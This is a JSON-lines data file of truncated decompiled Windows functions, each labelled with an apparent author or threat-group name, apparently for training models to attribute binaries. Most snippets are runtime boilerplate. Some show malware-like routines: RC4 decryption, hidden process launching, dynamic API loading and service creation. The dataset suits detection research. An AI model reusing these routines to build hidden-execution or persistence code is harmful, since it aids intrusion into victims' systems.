 return \"generic\";\n}\nint __stdcall sub_100010C0(int a1, int a2)\n{\n  char *v2; // eax\n  char *v3; // edx\n\n  v2 = (char *)sub_100023CC(a2);\n  v3 = \"unknown error\";\n  if ( v2 )\n    v3 = v2;\n  *(_DWORD *)(a1 + 20) = 15;\n  *(_DWORD *)(a1 + 16) = 0;\n  *(_BYTE *)a1 = 0;\n  if ( *v3 )\n    sub_10001F80(v3, strlen(v3));\n  else\n    sub_10001F80(v3, 0);\n  return a1;\n}\nconst char *sub_10001130()\n{\n  return \"iostream\";\n}\nint __stdcall sub_10001140(int a1, int a2)\n{\n  if ( a2 == 1 )\n  {\n    *(_DWORD *)(a1 + 20) = 15;\n    *(_DWORD *)(a1 + 16) = 0;\n    *(_BYTE *)a1 = 0;\n    sub_10001F80(\"iostream stream error\", 0x15u);\n  }\n  else\n  {\n    sub_100010C0(a1, a2);\n  }\n  return a1;\n}\nconst char *sub_10001190()\n{\n  return \"system\";\n}\nint __stdcall sub_100011A0(int a1, int a2)\n{\n  char *v2; // eax\n  char *v3; // edx\n\n  v2 = (char *)sub_100023F6(a2);\n  v3 = \"unknown error\";\n  if ( v2 )\n    v3 = v2;\n  *(_DWORD *)(a1 + 20) = 15;\n  *(_DWORD *)(a1 + 16) = 0;\n  *(_BYTE *)a1 = 0;\n  if ( *v3 )\n    sub_10001F80(v3, strlen(v3));\n  else\n    sub_10001F80(v3, 0);\n  return a1;\n}\n_DWORD *__stdcall sub_10001210(_DWORD *a1, int a2)\n{\n  bool v2; // zf\n  _DWORD *result; // eax\n\n  v2 = sub_100023CC(a2) == 0;\n  result = a1;\n  *a1 = a2;\n  if ( v2 )\n    a1[1] = off_10013288;\n  else\n    a1[1] = off_1001328C;\n  retu"}
{"author": "pacifier", "label": 7, "inputs": "_QWORD *__fastcall sub_180001000(_QWORD *a1, char a2)\n{\n  *a1 = &std::error_category::`vftable';\n  if ( (a2 & 1) != 0 )\n    j_free(a1);\n  return a1;\n}\n// Microsoft VisualC v7/14 64bit runtime\n// Microsoft VisualC v7/14 64bit runtime\n__int64 __fastcall unknown_libname_20(__int64 a1, __int64 a2, int a3)\n{\n  *(_DWORD *)a2 = a3;\n  *(_QWORD *)(a2 + 8) = a1;\n  return a2;\n}\nbool __fastcall sub_180001040(__int64 a1, unsigned int a2, __int64 a3)\n{\n  __int64 v4; // rax\n  char v6[24]; // [rsp+20h] [rbp-18h] BYREF\n\n  v4 = (*(__int64 (__fastcall **)(__int64, char *, _QWORD))(*(_QWORD *)a1 + 24i64))(a1, v6, a2);\n  return *(_QWORD *)(v4 + 8) == *(_QWORD *)(a3 + 8) && *(_DWORD *)v4 == *(_DWORD *)a3;\n}\nbool __fastcall sub_180001080(__int64 a1, __int64 a2, int a3)\n{\n  return a1 == *(_QWORD *)(a2 + 8) && *(_DWORD *)a2 == a3;\n}\nconst char *sub_1800010A0()\n{\n  return \"generic\";\n}\n_QWORD *__fastcall sub_1800010B0(__int64 a1, _QWORD *a2, unsigned int a3)\n{\n  size_t v3; // rbx\n  __int64 v5; // rax\n  char *v6; // rdx\n\n  v3 = 0i64;\n  v5 = sub_180003D54(a3);\n  a2[3] = 15i64;\n  a2[2] = 0i64;\n  v6 = \"unknown error\";\n  if ( v5 )\n    v6 = (char *)v5;\n  *(_BYTE *)a2 = 0;\n  if ( *v6 )\n  {\n    v3 = -1i64;\n    do\n      ++v3;\n    while ( v6[v3] );\n  }\n  sub_180003860(a2, v6, v3);\n  return a2;\n}\nconst char *sub_180001120()\n{\n  return \"iostream\";\n}\n_QWORD *__fastcall sub_180001130(__int64 a1, _QWORD *a2, unsigned int a3)\n{\n  if ( a3 == 1 )\n  {\n    a2[3] = 15i64;\n    a2[2] = 0i64;\n    *(_BYTE *)a2 = 0;\n    sub_180003860(a2, \"iostream stream error\", 0x15ui64);\n  }\n  else\n  {\n    sub_1800010B0(a1, a2, a3);\n  }\n  return a2;\n}\nconst char *sub_180001180()\n{\n  return \"system\";\n}\n_QWORD *__fastcall sub_180001190(__int64 a1, _QWORD *a2, unsigned int a3)\n{\n  size_t v3; // rbx\n  __int64 v5; // rax\n  char *v6; // rdx\n\n  v3 = 0i64;\n  v5 = sub_180003D7C(a3);\n  a2[3] = 15i64;\n  a2[2] = 0i64;\n  v6 = \"unknown error\";\n  if ( v5 )\n    v6 = (char *)v5;\n  *(_BYTE *)a2 = 0;\n  if ( *v6 )\n  {\n    v3 = -1i64;\n    do\n      ++v3;\n    while ( v6[v3] );\n  }\n  sub_180003860(a2, v"}
{"author": "pacifier", "label": 7, "inputs": "_QWORD *__fastcall sub_140001000(_QWORD *a1, char a2)\n{\n  *a1 = &std::error_category::`vftable';\n  if ( (a2 & 1) != 0 )\n    j_free(a1);\n  return a1;\n}\n// Microsoft VisualC v7/14 64bit runtime\n__int64 __fastcall unknown_libname_1(__int64 a1, __int64 a2, int a3)\n{\n  *(_DWORD *)a2 = a3;\n  *(_QWORD *)(a2 + 8) = a1;\n  return a2;\n}\nbool __fastcall sub_140001040(__int64 a1, unsigned int a2, __int64 a3)\n{\n  __int64 v4; // rax\n  char v6[24]; // [rsp+20h] [rbp-18h] BYREF\n\n  v4 = (*(__int64 (__fastcall **)(__int64, char *, _QWORD))(*(_QWORD *)a1 + 24i64))(a1, v6, a2);\n  return *(_QWORD *)(v4 + 8) == *(_QWORD *)(a3 + 8) && *(_DWORD *)v4 == *(_DWORD *)a3;\n}\nbool __fastcall sub_140001080(__int64 a1, __int64 a2, int a3)\n{\n  return a1 == *(_QWORD *)(a2 + 8) && *(_DWORD *)a2 == a3;\n}\nconst char *sub_1400010A0()\n{\n  return \"generic\";\n}\n_QWORD *__fastcall sub_1400010B0(__int64 a1, _QWORD *a2, unsigned int a3)\n{\n  size_t v3; // rbx\n  __int64 v5; // rax\n  char *v6; // rdx\n\n  v3 = 0i64;\n  v5 = sub_1400018A4(a3);\n  a2[3] = 15i64;\n  a2[2] = 0i64;\n  v6 = \"unknown error\";\n  if ( v5 )\n    v6 = (char *)v5;\n  *(_BYTE *)a2 = 0;\n  if ( *v6 )\n  {\n    v3 = -1i64;\n    do\n      ++v3;\n    while ( v6[v3] );\n  }\n  sub_140001460(a2, v6, v3);\n  return a2;\n}\nconst char *sub_140001120()\n{\n  return \"iostream\";\n}\n_QWORD *__fastcall sub_140001130(__int64 a1, _QWORD *a2, unsigned int a3)\n{\n  if ( a3 == 1 )\n  {\n    a2[3] = 15i64;\n    a2[2] = 0i64;\n    *(_BYTE *)a2 = 0;\n    sub_140001460(a2, \"iostream stream error\", 0x15ui64);\n  }\n  else\n  {\n    sub_1400010B0(a1, a2, a3);\n  }\n  return a2;\n}\nconst char *sub_140001180()\n{\n  return \"system\";\n}\n_QWORD *__fastcall sub_140001190(__int64 a1, _QWORD *a2, unsigned int a3)\n{\n  size_t v3; // rbx\n  __int64 v5; // rax\n  char *v6; // rdx\n\n  v3 = 0i64;\n  v5 = sub_1400018CC(a3);\n  a2[3] = 15i64;\n  a2[2] = 0i64;\n  v6 = \"unknown error\";\n  if ( v5 )\n    v6 = (char *)v5;\n  *(_BYTE *)a2 = 0;\n  if ( *v6 )\n  {\n    v3 = -1i64;\n    do\n      ++v3;\n    while ( v6[v3] );\n  }\n  sub_140001460(a2, v6, v3);\n  return a2;\n}\n__int64 __fastcall "}
{"author": "pacifier", "label": 7, "inputs": "void *__thiscall sub_10001000(void *Block, char a2)\n{\n  *(_DWORD *)Block = &std::error_category::`vftable';\n  if ( (a2 & 1) != 0 )\n    j__free(Block);\n  return Block;\n}\n_DWORD *__thiscall std::error_category::default_error_condition(void *this, _DWORD *a2, int a3)\n{\n  _DWORD *result; // eax\n\n  result = a2;\n  *a2 = a3;\n  a2[1] = this;\n  return result;\n}\nbool __thiscall sub_10001050(void *this, int a2, _DWORD *a3)\n{\n  _DWORD *v3; // eax\n  char v5[8]; // [esp+0h] [ebp-8h] BYREF\n\n  v3 = (_DWORD *)(*(int (__thiscall **)(void *, char *, int))(*(_DWORD *)this + 12))(this, v5, a2);\n  return v3[1] == a3[1] && *v3 == *a3;\n}\nbool __thiscall sub_10001090(void *this, _DWORD *a2, int a3)\n{\n  return this == (void *)a2[1] && *a2 == a3;\n}\nconst char *sub_100010B0()\n{\n  return \"generic\";\n}\nint __stdcall sub_100010C0(int a1, int a2)\n{\n  char *v2; // eax\n  char *v3; // edx\n\n  v2 = (char *)sub_100023CC(a2);\n  v3 = \"unknown error\";\n  if ( v2 )\n    v3 = v2;\n  *(_DWORD *)(a1 + 20) = 15;\n  *(_DWORD *)(a1 + 16) = 0;\n  *(_BYTE *)a1 = 0;\n  if ( *v3 )\n    sub_10001F80(v3, strlen(v3));\n  else\n    sub_10001F80(v3, 0);\n  return a1;\n}\nconst char *sub_10001130()\n{\n  return \"iostream\";\n}\nint __stdcall sub_10001140(int a1, int a2)\n{\n  if ( a2 == 1 )\n  {\n    *(_DWORD *)(a1 + 20) = 15;\n    *(_DWORD *)(a1 + 16) = 0;\n    *(_BYTE *)a1 = 0;\n    sub_10001F80(\"iostream stream error\", 0x15u);\n  }\n  else\n  {\n    sub_100010C0(a1, a2);\n  }\n  return a1;\n}\nconst char *sub_10001190()\n{\n  return \"system\";\n}\nint __stdcall sub_100011A0(int a1, int a2)\n{\n  char *v2; // eax\n  char *v3; // edx\n\n  v2 = (char *)sub_100023F6(a2);\n  v3 = \"unknown error\";\n  if ( v2 )\n    v3 = v2;\n  *(_DWORD *)(a1 + 20) = 15;\n  *(_DWORD *)(a1 + 16) = 0;\n  *(_BYTE *)a1 = 0;\n  if ( *v3 )\n    sub_10001F80(v3, strlen(v3));\n  else\n    sub_10001F80(v3, 0);\n  return a1;\n}\n_DWORD *__stdcall sub_10001210(_DWORD *a1, int a2)\n{\n  bool v2; // zf\n  _DWORD *result; // eax\n\n  v2 = sub_100023CC(a2) == 0;\n  result = a1;\n  *a1 = a2;\n  if ( v2 )\n    a1[1] = off_10013288;\n  else\n    a1[1] = off_1001328C;\n  retu"}
{"author": "pacifier", "label": 7, "inputs": "char __cdecl sub_401000(char *FileName)\n{\n  FILE *Stream; // [esp+0h] [ebp-4h]\n\n  Stream = fopen(FileName, \"r\");\n  if ( !Stream )\n    return 0;\n  fclose(Stream);\n  return 1;\n}\nHINSTANCE __cdecl sub_401040(LPCSTR lpFile)\n{\n  return ShellExecuteA(0, 0, lpFile, 0, 0, 1);\n}\nchar __cdecl sub_401060(int a1, int a2, int a3, int a4, int a5)\n{\n  int k; // [esp+0h] [ebp-124h]\n  int j; // [esp+4h] [ebp-120h]\n  int i; // [esp+8h] [ebp-11Ch]\n  int v9; // [esp+Ch] [ebp-118h]\n  char v10; // [esp+13h] [ebp-111h]\n  char v11; // [esp+13h] [ebp-111h]\n  char v12[260]; // [esp+14h] [ebp-110h]\n  int v13; // [esp+11Ch] [ebp-8h]\n  int v14; // [esp+120h] [ebp-4h]\n\n  v13 = 0;\n  v14 = 0;\n  for ( i = 0; i < 256; ++i )\n    v12[i] = i;\n  v9 = 0;\n  for ( j = 0; j < 256; ++j )\n  {\n    v9 = (*(unsigned __int8 *)(a1 + j % a2) + v9 + (unsigned __int8)v12[j]) % 256;\n    v10 = v12[j];\n    v12[j] = v12[(unsigned __int8)v9];\n    v12[(unsigned __int8)v9] = v10;\n  }\n  for ( k = 0; k < a4; ++k )\n  {\n    v13 = (v13 + 1) % 256;\n    v14 = (v14 + (unsigned __int8)v12[v13]) % 256;\n    v11 = v12[(unsigned __int8)v13];\n    v12[(unsigned __int8)v13] = v12[(unsigned __int8)v14];\n    v12[(unsigned __int8)v14] = v11;\n    *(_BYTE *)(k + a5) = v12[(unsigned __int8)(v12[(unsigned __int8)v14] + v12[(unsigned __int8)v13])] ^ *(_BYTE *)(k + a3);\n  }\n  return 1;\n}\nBOOL __cdecl sub_401280(LPCSTR lpApplicationName)\n{\n  BOOL v2; // [esp+0h] [ebp-5Ch]\n  struct _STARTUPINFOA StartupInfo; // [esp+4h] [ebp-58h] BYREF\n  struct _PROCESS_INFORMATION ProcessInformation; // [esp+4Ch] [ebp-10h] BYREF\n\n  memset(&StartupInfo, 0, sizeof(StartupInfo));\n  StartupInfo.cb = 68;\n  v2 = CreateProcessA(lpApplicationName, 0, 0, 0, 0, 0x8000000u, 0, 0, &StartupInfo, &ProcessInformation);\n  CloseHandle(StartupInfo.hStdError);\n  CloseHandle(StartupInfo.hStdInput);\n  CloseHandle(StartupInfo.hStdOutput);\n  CloseHandle(ProcessInformation.hThread);\n  CloseHandle(ProcessInformation.hProcess);\n  return v2;\n}\nint sub_401300()\n{\n  _DWORD *v0; // eax\n  char *v3; // [esp+Ch] [ebp-318h]\n  unsigned int v4; // "}
{"author": "pacifier", "label": 7, "inputs": "int __cdecl sub_401000(int a1, int a2, int a3, _DWORD *a4)\n{\n  int v4; // ebx\n  int result; // eax\n  int v6; // edi\n  int v7; // [esp+10h] [ebp-18Ch]\n  DWORD flOldProtect[83]; // [esp+24h] [ebp-178h] BYREF\n  void *Block; // [esp+170h] [ebp-2Ch]\n  int v10; // [esp+174h] [ebp-28h]\n  int v11; // [esp+178h] [ebp-24h]\n  int v12; // [esp+17Ch] [ebp-20h]\n  CPPEH_RECORD ms_exc; // [esp+184h] [ebp-18h] BYREF\n\n  if ( !a1 )\n    return -2;\n  flOldProtect[78] = 0;\n  Block = 0;\n  v11 = 0;\n  v10 = 0;\n  v12 = 0;\n  ms_exc.registration.TryLevel = 1;\n  v4 = sub_401510(flOldProtect, a1, a2);\n  if ( v4 )\n  {\n    _local_unwind4(&__security_cookie, &ms_exc.registration, -2);\n    result = v4;\n  }\n  else\n  {\n    v7 = sub_4013A0(flOldProtect, a3);\n    if ( v7 )\n    {\n      _local_unwind4(&__security_cookie, &ms_exc.registration, -2);\n      result = v7;\n    }\n    else\n    {\n      ms_exc.registration.TryLevel = 2;\n      v6 = sub_4016A0(flOldProtect, a1, a2, a3);\n      if ( v6\n        || (v6 = sub_4017C0(flOldProtect)) != 0\n        || (v6 = sub_401900(flOldProtect)) != 0\n        || (v6 = sub_401A80((DWORD)flOldProtect)) != 0\n        || (v6 = sub_401460(flOldProtect, a3)) != 0 )\n      {\n        _local_unwind4(&__security_cookie, &ms_exc.registration, -2);\n        result = v6;\n      }\n      else\n      {\n        if ( a4 )\n        {\n          *a4 = 32;\n          a4[1] = a3;\n          a4[2] = flOldProtect[81];\n          a4[3] = flOldProtect[82];\n          a4[4] = v12;\n          a4[5] = flOldProtect[46];\n          a4[6] = Block;\n          a4[7] = v10;\n          ms_exc.registration.TryLevel = 2;\n        }\n        _local_unwind4(&__security_cookie, &ms_exc.registration, -2);\n        result = 0;\n      }\n    }\n  }\n  return result;\n}\nBOOL __cdecl sub_4012E0(void *Buffer, int a2, size_t ElementCount, int a4)\n{\n  if ( !ElementCount )\n    return 1;\n  if ( a2 + ElementCount > *(_DWORD *)(a4 + 8) )\n    return 0;\n  fseek(*(FILE **)a4, a2 + *(_DWORD *)(a4 + 4), 0);\n  return fread(Buffer, 1u, ElementCount, *(FILE **)a4) == ElementCount;\n}\nint __cdecl sub_40134"}
{"author": "pacifier", "label": 7, "inputs": "_QWORD *__fastcall sub_180001000(_QWORD *a1, char a2)\n{\n  *a1 = &std::error_category::`vftable';\n  if ( (a2 & 1) != 0 )\n    j_free(a1);\n  return a1;\n}\n// Microsoft VisualC v7/14 64bit runtime\n// Microsoft VisualC v7/14 64bit runtime\n__int64 __fastcall unknown_libname_18(__int64 a1, __int64 a2, int a3)\n{\n  *(_DWORD *)a2 = a3;\n  *(_QWORD *)(a2 + 8) = a1;\n  return a2;\n}\nbool __fastcall sub_180001040(__int64 a1, unsigned int a2, __int64 a3)\n{\n  __int64 v4; // rax\n  char v6[24]; // [rsp+20h] [rbp-18h] BYREF\n\n  v4 = (*(__int64 (__fastcall **)(__int64, char *, _QWORD))(*(_QWORD *)a1 + 24i64))(a1, v6, a2);\n  return *(_QWORD *)(v4 + 8) == *(_QWORD *)(a3 + 8) && *(_DWORD *)v4 == *(_DWORD *)a3;\n}\nbool __fastcall sub_180001080(__int64 a1, __int64 a2, int a3)\n{\n  return a1 == *(_QWORD *)(a2 + 8) && *(_DWORD *)a2 == a3;\n}\nconst char *sub_1800010A0()\n{\n  return \"generic\";\n}\n_QWORD *__fastcall sub_1800010B0(__int64 a1, _QWORD *a2, unsigned int a3)\n{\n  size_t v3; // rbx\n  __int64 v5; // rax\n  char *v6; // rdx\n\n  v3 = 0i64;\n  v5 = sub_1800020C4(a3);\n  a2[3] = 15i64;\n  a2[2] = 0i64;\n  v6 = \"unknown error\";\n  if ( v5 )\n    v6 = (char *)v5;\n  *(_BYTE *)a2 = 0;\n  if ( *v6 )\n  {\n    v3 = -1i64;\n    do\n      ++v3;\n    while ( v6[v3] );\n  }\n  sub_180001C80(a2, v6, v3);\n  return a2;\n}\nconst char *sub_180001120()\n{\n  return \"iostream\";\n}\n_QWORD *__fastcall sub_180001130(__int64 a1, _QWORD *a2, unsigned int a3)\n{\n  if ( a3 == 1 )\n  {\n    a2[3] = 15i64;\n    a2[2] = 0i64;\n    *(_BYTE *)a2 = 0;\n    sub_180001C80(a2, \"iostream stream error\", 0x15ui64);\n  }\n  else\n  {\n    sub_1800010B0(a1, a2, a3);\n  }\n  return a2;\n}\nconst char *sub_180001180()\n{\n  return \"system\";\n}\n_QWORD *__fastcall sub_180001190(__int64 a1, _QWORD *a2, unsigned int a3)\n{\n  size_t v3; // rbx\n  __int64 v5; // rax\n  char *v6; // rdx\n\n  v3 = 0i64;\n  v5 = sub_1800020EC(a3);\n  a2[3] = 15i64;\n  a2[2] = 0i64;\n  v6 = \"unknown error\";\n  if ( v5 )\n    v6 = (char *)v5;\n  *(_BYTE *)a2 = 0;\n  if ( *v6 )\n  {\n    v3 = -1i64;\n    do\n      ++v3;\n    while ( v6[v3] );\n  }\n  sub_180001C80(a2, v"}
{"author": "pacifier", "label": 7, "inputs": "void *__cdecl operator new(unsigned int a1, void *a2)\n{\n  return a2;\n}\nvoid sub_10001010()\n{\n  ;\n}\nunsigned int __cdecl sub_10001020(const char *a1)\n{\n  unsigned int v2; // [esp+8h] [ebp-Ch]\n\n  if ( *a1 )\n    v2 = strlen(a1);\n  else\n    v2 = 0;\n  return v2;\n}\nvoid *__cdecl sub_10001070(void *a1, void *Src, size_t Size)\n{\n  void *v4; // [esp+0h] [ebp-4h]\n\n  if ( Size )\n    v4 = memmove_0(a1, Src, Size);\n  else\n    v4 = a1;\n  return v4;\n}\nvoid *__cdecl std::char_traits<char>::move(void *a1, void *Src, size_t Size)\n{\n  void *v4; // [esp+0h] [ebp-4h]\n\n  if ( Size )\n    v4 = memmove(a1, Src, Size);\n  else\n    v4 = a1;\n  return v4;\n}\n_BYTE *__cdecl std::char_traits<char>::assign(_BYTE *a1, _BYTE *a2)\n{\n  _BYTE *result; // eax\n\n  result = a1;\n  *a1 = *a2;\n  return result;\n}\n_DWORD *__thiscall sub_100010E0(_DWORD *this)\n{\n  *this = &std::error_category::`vftable';\n  return this;\n}\n_DWORD *__thiscall sub_10001100(_DWORD *this)\n{\n  _DWORD *result; // eax\n\n  result = this;\n  *this = &std::error_category::`vftable';\n  return result;\n}\nbool __thiscall std::error_category::operator==(void *this, void *a2)\n{\n  return this == a2;\n}\n_DWORD *__thiscall sub_10001150(_DWORD *this, char a2)\n{\n  sub_10001100(this);\n  if ( (a2 & 1) != 0 )\n    j__free(this);\n  return this;\n}\n// Microsoft VisualC 2-14/net runtime\nint __thiscall unknown_libname_1(void *this)\n{\n  return *(_DWORD *)this;\n}\n// Microsoft VisualC 2-14/net runtime\nint __thiscall unknown_libname_2(_DWORD *this)\n{\n  return this[1];\n}\n// Microsoft VisualC 2-14/net runtime\n_DWORD *__thiscall unknown_libname_3(_DWORD *this, int a2, int a3)\n{\n  *this = a2;\n  this[1] = a3;\n  return this;\n}\nbool __thiscall std::error_condition::operator==(_DWORD *this, _DWORD *a2)\n{\n  void *v2; // eax\n  int v3; // esi\n  void *v5; // [esp-4h] [ebp-10h]\n  bool v6; // [esp+4h] [ebp-8h]\n\n  v5 = (void *)unknown_libname_2(a2);\n  v2 = (void *)unknown_libname_2(this);\n  v6 = 0;\n  if ( std::error_category::operator==(v2, v5) )\n  {\n    v3 = unknown_libname_1(this);\n    if ( v3 == unknown_libname_1(a2) )\n      v6"}
{"author": "pacifier", "label": 7, "inputs": "char __cdecl sub_401000(int a1, int a2, int a3)\n{\n  int v3; // ecx\n  int v4; // edi\n  int v5; // ecx\n  int i; // eax\n  int j; // esi\n  unsigned __int8 v8; // dl\n  char *v9; // eax\n  int v10; // ecx\n  unsigned __int8 v11; // dl\n  int v12; // ecx\n  unsigned __int8 v13; // dl\n  int v14; // ecx\n  unsigned __int8 v15; // dl\n  int v16; // esi\n  int v17; // edx\n  int v18; // eax\n  char *v19; // ecx\n  char *v20; // edi\n  bool v21; // zf\n  char v23; // [esp+13h] [ebp-11Dh]\n  int v24; // [esp+14h] [ebp-11Ch]\n  char v25[256]; // [esp+2Ch] [ebp-104h] BYREF\n\n  v4 = v3;\n  v5 = 0;\n  for ( i = 0; i < 256; ++i )\n    v25[i] = i;\n  for ( j = 0; j < 256; j += 4 )\n  {\n    v8 = v25[j];\n    v9 = &v25[j];\n    v10 = (v5 + *(unsigned __int8 *)(j % 8 + v4) + v8) % 256;\n    *v9 = v25[(unsigned __int8)v10];\n    v25[(unsigned __int8)v10] = v8;\n    v11 = v25[j + 1];\n    v12 = (v10 + *(unsigned __int8 *)((int)&v25[j + 1 - (_DWORD)v25] % 8 + v4) + v11) % 256;\n    v9[1] = v25[(unsigned __int8)v12];\n    v25[(unsigned __int8)v12] = v11;\n    v13 = v25[j + 2];\n    v14 = (v12 + *(unsigned __int8 *)((int)&v25[j + 2 - (_DWORD)v25] % 8 + v4) + v13) % 256;\n    v9[2] = v25[(unsigned __int8)v14];\n    v25[(unsigned __int8)v14] = v13;\n    v15 = v25[j + 3];\n    v5 = (v14 + *(unsigned __int8 *)((int)&v25[j + 3 - (_DWORD)v25] % 8 + v4) + v15) % 256;\n    v9[3] = v25[(unsigned __int8)v5];\n    v25[(unsigned __int8)v5] = v15;\n  }\n  if ( a2 > 0 )\n  {\n    v16 = a3;\n    v17 = 0;\n    v24 = a2;\n    v18 = 0;\n    do\n    {\n      v18 = (v18 + 1) % 256;\n      v17 = ((unsigned __int8)v25[v18] + v17) % 256;\n      v19 = &v25[(unsigned __int8)v18];\n      v20 = &v25[(unsigned __int8)v17];\n      v23 = *v19;\n      *v19 = *v20;\n      *v20 = v23;\n      LOBYTE(v19) = *(_BYTE *)(v16 + a1 - a3) ^ v25[(unsigned __int8)(v23 + *v19)];\n      ++v16;\n      v21 = v24-- == 1;\n      *(_BYTE *)(v16 - 1) = (_BYTE)v19;\n    }\n    while ( !v21 );\n  }\n  return 1;\n}\nint __cdecl sub_401250(int a1, int a2, int a3)\n{\n  char v4[144]; // [esp+4h] [ebp-9Ch] BYREF\n  int v5; // [esp+9Ch] [ebp-4h]\n\n  std::ofstre"}
{"author": "pacifier", "label": 7, "inputs": "bool __stdcall sub_401000(int a1, int a2, LPWSTR pszPath)\n{\n  const ITEMIDLIST *v4; // eax\n  ITEMIDLIST *v5; // esi\n  BOOL v6; // edi\n  char v7; // [esp+0h] [ebp-22Ch] BYREF\n  struct _browseinfoW bi; // [esp+208h] [ebp-24h] BYREF\n  IMalloc *ppMalloc; // [esp+228h] [ebp-4h] BYREF\n\n  if ( SHGetMalloc(&ppMalloc) )\n    return 0;\n  bi.pidlRoot = 0;\n  bi.lpfn = 0;\n  bi.lParam = 0;\n  bi.hwndOwner = (HWND)a1;\n  bi.pszDisplayName = (LPWSTR)&v7;\n  bi.lpszTitle = (LPCWSTR)a2;\n  bi.ulFlags = 65;\n  v4 = SHBrowseForFolderW(&bi);\n  v5 = (ITEMIDLIST *)v4;\n  if ( !v4 )\n    return 0;\n  v6 = SHGetPathFromIDListW(v4, pszPath);\n  ppMalloc->lpVtbl->Free(ppMalloc, v5);\n  return v6;\n}\nchar __stdcall sub_40107C(int a1, char a2, wchar_t *Source, int a4, char a5)\n{\n  _WORD *v5; // edi\n  char v6; // al\n  wchar_t *v7; // eax\n  wchar_t *v8; // edi\n  wchar_t *v9; // eax\n  char result; // al\n  __int16 v11[2]; // [esp+8h] [ebp-2008h] BYREF\n  wchar_t v12[2048]; // [esp+Ch] [ebp-2004h] BYREF\n  wchar_t Destination[2050]; // [esp+100Ch] [ebp-1004h] BYREF\n  wchar_t *Sourcea; // [esp+2020h] [ebp+10h]\n\n  Sourcea = (wchar_t *)sub_40632F(Source, 0);\n  sub_40B52B(a1);\n  while ( 1 )\n  {\n    result = sub_40B64D(Destination, 2048);\n    if ( !result )\n      return result;\n    v5 = (_WORD *)sub_406151(Destination);\n    v6 = sub_40618C((unsigned __int16)*v5);\n    if ( !a2 )\n    {\n      if ( v6 )\n        wcscat(Destination, ::Source);\n      goto LABEL_9;\n    }\n    if ( v6 )\n    {\n      *v5 = 0;\nLABEL_9:\n      v8 = Sourcea;\n      if ( Destination[0] == 42 )\n      {\n        if ( (unsigned __int8)sub_40618C(Destination[1]) )\n        {\n          v11[0] = 46;\n          v11[1] = 92;\n          sub_40B3D6(v12, Sourcea, 2048);\n          v8 = (wchar_t *)v11;\n        }\n      }\n      v9 = (wchar_t *)sub_40632F(Destination, 0);\n      if ( (unsigned __int8)sub_405EE9(v9, v8, a5) )\n        return 1;\n    }\n    else\n    {\n      v7 = (wchar_t *)sub_4062F2(Destination);\n      if ( !(unsigned __int8)sub_40616B(v7) )\n        goto LABEL_9;\n    }\n  }\n}\nint __stdcall sub_401185(wchar_t"}
{"author": "promethium", "label": 8, "inputs": "FARPROC sub_401000()\n{\n  int v0; // ecx\n  WCHAR *v1; // eax\n  int v2; // ecx\n  _BYTE *v3; // eax\n  int v4; // ecx\n  _BYTE *v5; // eax\n  int v6; // ecx\n  _BYTE *v7; // eax\n  unsigned int v8; // edx\n  unsigned int i; // edx\n  HMODULE v10; // edi\n  HMODULE v11; // eax\n  FARPROC result; // eax\n  DWORD VolumeSerialNumber; // [esp+4h] [ebp-278h] BYREF\n  CHAR v14[16]; // [esp+8h] [ebp-274h] BYREF\n  CHAR v15[16]; // [esp+18h] [ebp-264h] BYREF\n  char v16[20]; // [esp+28h] [ebp-254h] BYREF\n  char v17[20]; // [esp+3Ch] [ebp-240h] BYREF\n  char v18[20]; // [esp+50h] [ebp-22Ch] BYREF\n  char v19[20]; // [esp+64h] [ebp-218h] BYREF\n  char v20[20]; // [esp+78h] [ebp-204h] BYREF\n  char v21[20]; // [esp+8Ch] [ebp-1F0h] BYREF\n  char v22[20]; // [esp+A0h] [ebp-1DCh] BYREF\n  char v23[24]; // [esp+B4h] [ebp-1C8h] BYREF\n  char v24[28]; // [esp+CCh] [ebp-1B0h] BYREF\n  wchar_t Source[2]; // [esp+E8h] [ebp-194h] BYREF\n  int v26; // [esp+ECh] [ebp-190h]\n  int v27; // [esp+F0h] [ebp-18Ch]\n  int v28; // [esp+F4h] [ebp-188h]\n  int v29; // [esp+F8h] [ebp-184h]\n  int v30; // [esp+FCh] [ebp-180h]\n  void *v31; // [esp+100h] [ebp-17Ch]\n  int v32; // [esp+104h] [ebp-178h]\n  int v33; // [esp+108h] [ebp-174h]\n  int v34; // [esp+10Ch] [ebp-170h]\n  int v35; // [esp+110h] [ebp-16Ch]\n  int v36; // [esp+114h] [ebp-168h]\n  int v37; // [esp+118h] [ebp-164h]\n  int v38; // [esp+11Ch] [ebp-160h]\n  int v39; // [esp+120h] [ebp-15Ch]\n  int v40; // [esp+124h] [ebp-158h]\n  int v41; // [esp+128h] [ebp-154h]\n  __int16 v42; // [esp+12Ch] [ebp-150h]\n  int v43[28]; // [esp+130h] [ebp-14Ch] BYREF\n  int v44[28]; // [esp+1A0h] [ebp-DCh] BYREF\n  int v45[5]; // [esp+210h] [ebp-6Ch] BYREF\n  WCHAR LibFileName[2]; // [esp+224h] [ebp-58h] BYREF\n  int v47; // [esp+228h] [ebp-54h]\n  int v48; // [esp+22Ch] [ebp-50h]\n  int v49; // [esp+230h] [ebp-4Ch]\n  WCHAR RootPathName[2]; // [esp+234h] [ebp-48h] BYREF\n  int v51; // [esp+238h] [ebp-44h]\n  __int16 v52; // [esp+23Ch] [ebp-40h]\n  char v53[16]; // [esp+240h] [ebp-3Ch] BYREF\n  char v54[16]; // [esp+250h] [ebp-2Ch] BYREF\n  CHAR ProcName["}
{"author": "promethium", "label": 8, "inputs": "int __usercall sub_401000@<eax>(DWORD a1@<edx>, const void *a2@<ecx>, const CHAR *lpFileName)\n{\n  BOOL v3; // edi\n  HANDLE v5; // esi\n  DWORD NumberOfBytesWritten; // [esp+10h] [ebp-8h] BYREF\n\n  v3 = 0;\n  v5 = CreateFileA(lpFileName, 0xC0000000, 0, 0, 1u, 0x80u, 0);\n  if ( GetLastError() == 80 )\n    return 1;\n  if ( v5 != (HANDLE)-1 )\n  {\n    v3 = WriteFile(v5, a2, a1, &NumberOfBytesWritten, 0);\n    CloseHandle(v5);\n  }\n  return v3;\n}\nSC_HANDLE __thiscall sub_401090(LPCSTR lpBinaryPathName)\n{\n  SC_HANDLE result; // eax\n  SC_HANDLE v3; // edi\n  SC_HANDLE v4; // esi\n  int *Info; // [esp+8h] [ebp-80h] BYREF\n  int v6[19]; // [esp+Ch] [ebp-7Ch] BYREF\n  CHAR DisplayName[32]; // [esp+58h] [ebp-30h] BYREF\n  CHAR ServiceName[12]; // [esp+78h] [ebp-10h] BYREF\n\n  Info = 0;\n  result = OpenSCManagerA(0, 0, 0xF003Fu);\n  v3 = result;\n  if ( result )\n  {\n    strcpy(ServiceName, 